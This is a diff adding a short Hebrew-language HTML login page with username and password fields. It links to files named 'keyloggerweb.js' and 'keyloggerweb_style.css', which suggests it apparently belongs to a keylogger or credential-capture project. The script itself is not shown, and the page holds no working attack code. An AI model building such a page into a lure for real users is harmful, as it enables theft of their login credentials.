@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login page</title>
+    <link rel="stylesheet" href="keyloggerweb_style.css"> <!-- קישור ל-CSS -->
+</head>
+<body style="direction: rtl;">
+
+<form onsubmit="event.preventDefault(); login();">
+    <input type="text" id="username" placeholder="שם משתמש" required>
+    <input type="password" id="password" placeholder="סיסמה" required>
+    <button type="submit">התחבר</button>
+    <p id="error-message" style="color: red;"></p>
+</form>
+
+
+    <script src="keyloggerweb.js"></script> <!-- קישור ל-JS -->
+
+</body>
+</html>
